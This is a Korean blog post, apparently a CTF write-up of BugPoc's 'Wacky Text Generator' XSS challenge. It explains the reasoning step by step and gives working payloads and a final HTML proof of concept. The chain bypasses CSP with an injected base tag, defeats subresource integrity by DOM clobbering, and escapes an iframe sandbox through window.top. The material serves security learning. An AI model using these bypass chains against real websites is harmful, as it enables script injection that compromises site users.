---
layout: post
date: 2021-06-10 00:00:11
title: "Wacky Text Generator Write Up"
categories: CTF
tags: [XSS]
author:
  - Jeongwon Jo

---
## Descriptions

[BugPoc](https://bugpoc.com/)에서 만든 XSS Challenge이고, 문제의 목적은 CSP/SRI 및 Sandbox를 우회하고, XSS를 트리거 하는 것이다.

---
## Analysis

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/1.png?raw=true)

위 사진을 보면 Wacky Text를 입력해주면 해당 값이 Dom 내부에 삽입되는 것을 볼 수 있다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/2.png?raw=true)

콘솔창을 확인해 보니 `iframe`을 이용해서 `/frame.html`의 돔을 끌어와서 사용하는 것을 볼 수 있다. 

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/3.png?raw=true)

그래서 `/frame.html`로 접근을 해보니 아니나 다를까 Error 페이지가 발생하는 것 이었다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/4.png?raw=true)

코드를 확인해 보니 190 line에서 window.name의 값이 "iframe"인 지 아닌 지를 검증하고 있고, window.name의 값이 "iframe"이 아니라면 else 문에 의해서 Error 페이지가 출력이 되는 것 이다.

```html
<!DOCTYPE html>
<html>
    <head>
        <title>XSS Poc : CSP/SRI/Sandbox Bypass</title>
    </head>
    <body>
        <script>
            const exploit = function (){
                const payload = 'pocas';
                const url = `https://wacky.buggywebsite.com/frame.html?param=${payload}`;

                window.name = 'iframe';
                window.location = url;
            }
        </script>

       <h3>If you click the button below.</h3>
        <input type='button' onclick= 'exploit()' value='Trigger'>
    </body>
</html>
```
그래서 위와 같이 window.name의 값으로 "iframe"을 주고, window.location 메서드를 이용해서 라디아렉트를 시켜주니 window.name 검증은 쉽게 해결 할 수 있었다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/5.png?raw=true)

그리고 나서 `<svg/onload=alert(1)>`을 이용해서 XSS 트리거를 시도 했지만 입력값이 split으로 쪼개져서 위와 같이 들어가게 된다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/6.png?raw=true)

하지만 입력값이 바디 부분에만 들어가는 것이 아닌 헤드에 있는 타이틀의 값으로도 들어가기 때문에 타이틀 태그를 닫고 xss 트리거 시도를 하면 될 거 같다.

```
Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'nonce-jogzjbybjuiy' 'strict-dynamic'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present.
```
그래서 `</title><svg/onload=alert(1)>`를 전달해주니 Dom Parsing에 의해서 Dom으로 잘 들어가는 것을 확인 할 수 있었는데 위와 같이 CSP 에러가 나는 것을 확인 할 수 있었다.

```
content-security-policy: script-src 'nonce-jogzjbybjuiy' 'strict-dynamic'; frame-src 'self'; object-src 'none';
```
Response를 확인해보면 위와 같이 CSP가 설정되어 있는 것을 볼 수 있다. 그래서 `CSP Evaluator`를 이용해서 해당 CSP 위험도를 확인해보니 base-uri가 누락되면 스크립트를 삽입할 수 있다고 한다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/7.png?raw=true)

그래서 개인서버에 xss payload를 올리고 위와 같이 <base> 태그를 이용해서 익스를 시도하니 CSP는 우회가 되었지만 SRI에 걸리는 것을 볼 수 있다. SRI는 SubResource Integrity의 줄임말로 무결성을 체크하는 보안 설정 중 하나이다. 이는 웹 서버의 코드가 위/변조가 발생하면 해당 스크립트의 실행을 중지하게 된다. 또한 무결성을 확인을 할 때는 고유의 Hash 값을 이용해서 검증을 한다.

```js
// securely load the frame analytics code
			if (fileIntegrity.value) {
				
				// create a sandboxed iframe
				analyticsFrame = document.createElement('iframe');
				analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
				analyticsFrame.setAttribute('class', 'invisible');
				document.body.appendChild(analyticsFrame);

				// securely add the analytics code into iframe
				script = document.createElement('script');
				script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
				script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
				script.setAttribute('crossorigin', 'anonymous');
				analyticsFrame.contentDocument.body.appendChild(script);
				
			}
```
위 코드를 확인해 보면 fileIntegrity 객체의 있는 value 값을 이용해서 hash 값을 가져오고, 해당 hash 값과 고유의 hash 값을 비교하게 된다. 다시 SRI 에러를 확인해보면 `https://nq5h16dpmbg2.redir.bugpoc.ninja/files/analytics/js/frame-analytics.js`의 대한 Integrity의 digest 값을 찾지 못 해서 `<your hash value>` 값을 블록했다고 한다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/9.png?raw=true)

`/files/analytics/js/frame-analytics.js`의 값을 확인 해보면 위와 같다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/8.png?raw=true)

그리고 base 태그를 이용해서 스크립트를 삽입 한 후에는 `frame-analytics.js`의 값이 alert(1)로 변조가 된 것을 볼 수 있다. 

```
openssl dgst -sha384 -binary FILENAME.js | openssl base64 -A
```

그럼 `frame-.js`의 파일 값이 변조가 되었다고 왜 SRI에 걸리냐고 궁금해 할 수도 있다. 이는 Hash를 생성하는 방법을 보면 알다시피 특정 파일 값을 기준으로 hash 값을 생성한다. 즉, 문제에서는 alert(1)로 변조 되기 전에 파일 값으로 hash 값을 생성해서 사용하고 있는데, 우리가 해당 파일의 값을 alert(1)로 변조하였기 때문에 hash 값 자체가 달라지므로 SRI에 걸리게 된다.

```
fileIntegrity.value
```

하지만 js 단에서 Integrity 값을 가져 올 때, 위와 같이 값을 가져오게 된다. 하지만 우리는 해당 값으로 고유의 hash 값을 넣어줘야 하는데 이는 `Dom Clobbering` 기법을 이용해서 처리할 수 있다.

```html
<output id="fileIntegrity">Hello Pocas</output>
<script>
    alert(fileIntegrity.value);
</script>
```
![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/10.png?raw=truee)

위와 같이 코드를 올리고 실행하면 `fileIntegrity.value`의 값으로 `Hello Pocas`가 들어가는 것을 볼 수 있다.

```html
</title><output id="fileIntegrity">Hello Pocas</output>
```

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/11.png?raw=true)

그래서 위 페이로드를 작성해서 전달해주고, 콘솔 창에서 fileIntegrity.value를 입력해보면 우리가 입력한 고유의 값이 박힌 것을 볼 수 있다.

```html
</title><BASE HREF="https://nq5h16dpmbg2.redir.bugpoc.ninja"><output id="fileIntegrity">bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF%2bpI=</output>
```

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/12.png?raw=true)

그래서 `Dom Clobbering` 기법을 이용해서 fileIntegrity의 값을 변조해주니 SRI도 잘 우회한 것을 볼 수 있다. 하지만 위와 같이 `Sandbox` 설정에 의해서 alert() 함수가 실행이 되지 않는 것을 볼 수 있다. 하지만 이 `Sandbox`는 현재 Iframe에만 적용이 되어 있기 때문에 `top`, `parent` 돔의 참조해서 alert()를 끌어와 사용하면 쉽게 우회할 수 있다.

```html
</title><BASE HREF="https://p93yp8ell2os.redir.bugpoc.ninja"><output id="fileIntegrity">pUo1a+NaJwmvkDH8uSo6a1Z+emeQfamsHK2k52tjpTE=</output>
```

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/13.png?raw=true)

그래서 마지막으로 위와 같이 페이로드를 작성해주고 보내주면 XSS가 잘 트리거 되는 것을 볼 수 있다. 또한 위 페이로드가 전 페이로드와 Hash 값이 다른 이유는 위에 이야기 했다 시피 고유의 해쉬 값은 파일의 컨텐츠 값에 따라서 달라지기 때문이다.

```
frame-analytics.js의 값이 alert(1) 일 때의 해쉬 값 => bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=
frame-analytics.js의 값이 window.top.alert(1) 일 때의 해쉬 값 => pUo1a+NaJwmvkDH8uSo6a1Z+emeQfamsHK2k52tjpTE=
frame-analytics.js의 값이 window.parent.alert(1) 일 때의 해쉬 값 => Vxz2g08RDzmBMHlaYk0sNqiCWbU6UKBSCH+xw2Qa1dM=
```
위와 같이 다 다르다 ㅇㅇ

---
## Poc (Sollution)

```html
<!DOCTYPE html>
<html>
    <head>
        <title>XSS Poc : CSP/SRI/Sandbox Bypass</title>
    </head>
    <body>
        <script>
            // content-security-policy: script-src 'nonce-gyzyfhmynqlj' 'strict-dynamic'; frame-src 'self'; object-src 'none';
            // TR;DL : XSS => CSP Bypass and SRI Bypass using the Dom Clobbering. And finally trigger a xss using the window.top.alert(1).
            // First, I bypassed csp using the base tag.
            // Second, I bypassed integrity value used in SRI(SubResource Integrity) using the Dom Clobbering.
            // Why using the window.top? We should call the alert() method on the wintow.top and window.parent because Using the `sandbox allow-scripts allow-same-origin` in Child iframe. This is sandbox bypass.
                       
            const Dom_Clobbering = function () {
                const payload = '</title><form><output id="fileIntegrity">Modified</output>';
                const url = `https://wacky.buggywebsite.com/frame.html?param=${payload}`;

                window.name = 'iframe';
                window.location = url;
            }

            const exploit = function (){
                const payload = '</title><BASE HREF="https://mfol4633a69b.redir.bugpoc.ninja"><form><output id="fileIntegrity">F0NfquGiAKFW0hvQsOmMsnAyVCjs3sjH0IyIf8wogAU=</output>';
                const url = `https://wacky.buggywebsite.com/frame.html?param=${payload}`;

                window.name = 'iframe';
                window.location = url;
            }
        </script>

        <h1>BugPoc XSS Challenge</h1>
        <h3>If you click the button below and Enter the `console.log(fileIntegrity.value);` on the chrome console window, You can see that the hash value has been modified to 'Modified'</h3>
        <input type='button' onclick= 'Dom_Clobbering()' value='Test'>

        <h3>If you click the button below and execute poc code, You can trigger the xss.</h3>
        <input type='button' onclick= 'exploit()' value='Trigger'>
    </body>
</html>
```

---
## Reference

[https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)<br>
[https://portswigger.net/research/dom-clobbering-strikes-back](https://portswigger.net/research/dom-clobbering-strikes-back)<br>
[https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)

---
